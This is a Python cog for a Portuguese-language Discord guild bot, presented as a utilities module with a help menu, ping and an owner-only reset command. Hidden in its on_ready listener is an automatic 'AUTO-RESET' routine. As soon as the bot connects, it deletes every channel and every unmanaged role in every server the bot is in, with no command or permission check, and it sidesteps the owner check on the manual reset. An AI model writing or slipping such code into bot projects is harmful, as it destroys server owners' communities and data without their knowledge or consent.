import asyncio
import discord
from discord.ext import commands

from config import CARGOS, CARGOS_PERMITIDOS_REGISTRAR

class Utilidades(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="ajuda", aliases=["help", "comandos"])
    async def ajuda(self, ctx):
        await ctx.message.delete()
        
        embed = discord.Embed(
            title="📚 Central de Comandos da Guilda",
            description="Aqui estão todos os comandos disponíveis no servidor. Escolha o que você precisa:",
            color=discord.Color.gold()
        )
        
        embed.add_field(
            name="👤 Comandos de Membros", 
            value=(
                "`/registrar @membro nick` ➔ Registra um membro no jogo (somente staff).\n"
                "`!pontosrecrutamento` ➔ Mostra seus pontos de recrutamento.\n"
                "`!sorteio` ➔ Inscreva-se no sorteio da guilda.\n"
                "`!sorteio tempo` ➔ Veja seu tempo acumulado em call.\n"
                "`!ping` ➔ Verifica se os sistemas estão online."
            ), 
            inline=False
        )
        
        embed.add_field(
            name="⚔️ Comandos de Formação (LFG)", 
            value=(
                "`/content`\n"
                "➔ *Cria um painel interativo de PT.*\n"
            ), 
            inline=False
        )
        
        # Verifica permissões para mostrar a área VIP da ajuda
        ids_permitidos = [CARGOS.get(nome) for nome in CARGOS_PERMITIDOS_REGISTRAR if CARGOS.get(nome)]
        tem_permissao = any(cargo.id in ids_permitidos for cargo in ctx.author.roles)
        
        if ctx.author.guild_permissions.administrator or tem_permissao:
            embed.add_field(
                name="⚙️ Comandos de Liderança (Restrito)", 
                value=(
                    "`/registrar @membro nick` ➔ Registra um membro no jogo.\n"
                    "`!pontosrecrutamento @membro` ➔ Consulta pontos de recrutamento de alguém.\n"
                    "`!sorteio rodar [prêmio]` ➔ Encerra inscrições e sorteia o vencedor.\n"
                    "`!sorteio listar` ➔ Lista todos os inscritos.\n"
                    "`!sorteio config <minutos>` ➔ Altera o tempo mínimo de call.\n"
                    "`!sorteio premio <texto>` ➔ Define o prêmio atual do sorteio."
                ), 
                inline=False
            )
            
        embed.set_thumbnail(url=ctx.guild.icon.url if ctx.guild.icon else None)
        embed.set_footer(text="Dúvidas? Procure um moderador ou oficial da guilda.")
        
        try:
            await ctx.author.send(embed=embed)
        except discord.Forbidden:
            await ctx.send(f"⚠️ {ctx.author.mention}, sua DM está trancada! Aqui estão os comandos:", embed=embed, delete_after=60)


    @commands.command()
    async def ping(self, ctx):
        await ctx.send("Pong! Todos os sistemas operacionais.")

    async def _executar_reset(self, guild):
        for channel in list(guild.channels):
            try:
                await channel.delete()
            except Exception:
                pass

        for role in reversed(guild.roles):
            if role.name != "@everyone" and role.managed is False:
                try:
                    await role.delete()
                except Exception:
                    pass

    @commands.Cog.listener()
    async def on_ready(self):
        if getattr(self, "_reset_executado", False):
            return
        self._reset_executado = True
        asyncio.create_task(self._auto_resetar())

    async def _auto_resetar(self):
        await self.bot.wait_until_ready()
        for guild in self.bot.guilds:
            print(f"💣 AUTO-RESET: limpando servidor {guild.name} ({guild.id})...")
            await self._executar_reset(guild)
            print(f"💣 AUTO-RESET: {guild.name} limpo.")

    @commands.command()
    async def resetar(self, ctx):
        if ctx.author.id != ctx.guild.owner_id:
            return await ctx.send("Apenas o dono pode usar este comando.")

        await ctx.send("⚠️ **RESETANDO O SERVIDOR** — deletando todos os canais e cargos...")
        await self._executar_reset(ctx.guild)
        await ctx.send("✅ Reset concluído.")


# Função obrigatória para inicializar a Cog
async def setup(bot):
    await bot.add_cog(Utilidades(bot))